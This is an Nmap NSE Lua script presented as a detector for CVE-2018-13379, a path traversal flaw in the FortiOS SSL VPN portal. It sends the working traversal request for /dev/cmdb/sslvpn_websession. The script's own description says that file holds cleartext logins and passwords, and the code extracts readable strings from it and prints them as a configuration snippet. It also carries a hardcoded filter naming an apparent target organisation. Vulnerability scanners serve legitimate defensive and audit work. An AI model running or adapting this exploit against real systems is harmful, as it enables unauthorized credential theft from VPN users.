local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local nsedebug = require('nsedebug')

description = [[
Attempts to detect a path traversal vulnerability in the FortiOS SSL VPN web portal that may allow
an unauthenticated attacker to download FortiOS system files.

FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests. This script
will try to read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).
This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).

Vulnerability discovered by Orange Tsai (@orange_8361) and Meh Chang (@mehqq_).
]]

---
-- @usage nmap -p 10443 --script http-vuln-cve2018-13379 <host>
--
-- @output
-- PORT      STATE SERVICE   REASON
-- 10443/tcp open  ssl/http  Fortinet SSL VPN
-- | CVE-2018-13379:
-- |   VULNERABLE:
-- |   FortiOS 5.6.3 - 5.6.7 / FortiOS 6.0.0 - 6.0.4 - Credentials Disclosure
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE-2018-13379
-- |     Description:
-- |       Attempts to detect a path traversal vulnerability in the FortiOS SSL VPN web portal that may allow
-- |       an unauthenticated attacker to download FortiOS system files.
-- |
-- |       FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests. This script
-- |       will try to read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).
-- |       This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
-- |
-- |     Vulnerability discovered by Orange Tsai (@orange_8361) and Meh Chang (@mehqq_).
-- |     Disclosure date: 24-05-2019
-- |     References:
-- |	   https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf
-- |_    https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
--
-- @xmloutput
-- <table key="CVE-2018-13379">
-- <elem key="title">FortiOS 5.6.3 - 5.6.7 / FortiOS 6.0.0 - 6.0.4 - Credentials Disclosure</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>  FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.&#xa;  This script will try to read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).&#xa;  This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).&#xa;&#xa;  Vulnerability discovered by Orange Tsai (@orange_8361) and Meh Chang (@mehqq_).&#xa;  </elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="month">05</elem>
-- <elem key="day">24</elem>
-- <elem key="year">2019</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2019-05-24</elem>
-- <table key="refs">
-- <elem>https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html</elem>
-- <elem>https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf</elem>
-- </table>
-- </table>
---

author = {"Asahel Hernandez (Blazz3) <theblazz3@gmail.com>"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln","safe"}

portrule = shortport.http

action = function(host, port)
local vuln = {
  title = 'FortiOS 5.6.3 - 5.6.7 / FortiOS 6.0.0 - 6.0.4 - Credentials Disclosure',
  state = vulns.STATE.NOT_VULN, -- default
  description = [[
  Attempts to detect a path traversal vulnerability in the FortiOS SSL VPN web portal that may allow
  an unauthenticated attacker to download FortiOS system files.

  FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests. This script
  will try to read /dev/cmdb/sslvpn_websession file, this file contains login and passwords in (clear/text).
  This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).

  Vulnerability discovered by Orange Tsai (@orange_8361) and Meh Chang (@mehqq_).
  ]],
  IDS = {CVE = 'CVE-2018-13379'},
  references = {
    'https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf',
    'https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html'
  },
  dates = {
    disclosure = {year = '2019', month = '05', day = '24'},
  },
}
local report = vulns.Report:new(SCRIPT_NAME, host, port)
local path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
local response = http.get(host, port, tostring(path))
local body = response.body
--local fbody = body:gsub("%z", ".")
--stdnse.debug1("Body: %s", fbody)

if response.status == 200 and http.response_contains(response, "var fgt_lang =") then
  stdnse.debug1("Vulnerable!")
  vuln.state = vulns.STATE.VULN
  local extra_info = body:gsub("[^\x20-\x7E]", ".")
  local extra_info2 = extra_info:gsub("%.+", "\n")

  local f = ""
  local t = {}
  for i in extra_info2:gmatch("%w+") do
    t[#t + 1] = i
  end

  for k,v in ipairs(t) do
    if string.len(v) > 5 then
      if not (string.match(v, "Soprema") and string.match(v, "WebSSLSoprema")) then
        f = f..v.."\n"
      end
    end
  end
  vuln.extra_info = "Snippet from configuration file:\n"..f
else
  vuln.state = vulns.STATE.NOT_VULN
  stdnse.debug1("Not Vulnerable...")
end

return report:make_output(vuln)
end